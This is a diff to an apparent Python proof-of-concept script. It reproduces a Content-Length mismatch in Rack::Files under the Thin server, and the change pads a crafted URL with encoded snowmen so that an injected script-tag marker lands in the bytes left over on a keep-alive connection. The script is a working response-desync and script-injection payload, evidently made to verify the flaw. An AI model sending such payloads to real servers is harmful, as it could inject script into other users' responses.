@@ -89,17 +89,19 @@ def main() -> int:
         try:
             wait_for_port(18181, thin, "Thin", thin_log)
 
-            suffix = (
-                "%3Cscript%3EA_CONTROLLED_MARKER%3C%2Fscript%3E"
-                if os.environ.get("RACK_THIN_IMPACT") == "1"
-                else "A_CONTROLLED_MARKER"
-            )
-            # Rack::Files uses character count for Content-Length. With this
-            # prefix length, the decoded script marker starts exactly at the
-            # byte offset advertised by Content-Length, so it is the first
-            # delayed byte rather than being buried at the end of the tail.
-            snowmen = 18 if os.environ.get("RACK_THIN_IMPACT") == "1" else 80
-            path = "/missing/" + "%E2%98%83" * snowmen + suffix
+            impact = os.environ.get("RACK_THIN_IMPACT") == "1"
+            if impact:
+                # Keep a long delayed tail like the core test, but place the
+                # decoded script marker at its beginning. For 80 snowmen
+                # before a 36-byte marker, 124 snowmen after it makes the
+                # marker start at the byte offset advertised by Content-Length.
+                path = (
+                    "/missing/" + "%E2%98%83" * 80
+                    + "%3Cscript%3EA_CONTROLLED_MARKER%3C%2Fscript%3E"
+                    + "%E2%98%83" * 124
+                )
+            else:
+                path = "/missing/" + "%E2%98%83" * 80 + "A_CONTROLLED_MARKER"
             direct_request = (
                 f"GET {path} HTTP/1.1\r\nHost: tenant-a.example\r\n"
                 "Connection: keep-alive\r\n\r\n"
@@ -119,6 +121,8 @@ def main() -> int:
             print(f"rack_thin_direct_declared={declared}")
             print(f"rack_thin_direct_actual={len(body) + len(extra)}")
             print(f"rack_thin_direct_mismatch={len(body) + len(extra) > declared}")
+            if impact:
+                print(f"rack_thin_direct_tail_prefix={extra[:80]!r}")
             if len(body) + len(extra) <= declared:
                 raise AssertionError("Thin did not emit the expected real mismatch")
 
